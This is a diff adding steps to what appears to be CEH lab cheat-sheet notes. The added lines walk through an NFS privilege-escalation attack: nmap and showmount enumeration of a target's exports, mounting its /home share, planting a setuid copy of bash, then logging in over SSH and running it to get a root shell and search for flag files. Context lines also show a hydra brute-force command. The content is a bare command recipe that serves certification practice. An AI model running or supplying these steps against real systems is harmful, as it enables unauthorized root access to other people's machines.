@@ -82,6 +82,23 @@ Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Usern
    cd /
    find . -name imroot.txt
    cat givenpath/imroot.txt
+6- nmap -sV —p 2049 IP/Subnet
+sudo apt-get install nfs-common
+nmap -sV —script=nfs-showmount <Target_IP>
+showmount -e <Target_IP>
+mkdir /tmp/nfs
+sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
+cd /tmp/nfs
+sudo cp /bin/bash .
+sudo chmod +s bash
+ls -la
+sudo df -h
+sudo chmod +s bash
+ssh smith@192.168.0.x
+./bash -p
+cd /home
+ls -la
+find / -name "*.txt" -ls 2> /dev/null
 ```
 #  Hacking Web Application
 ```
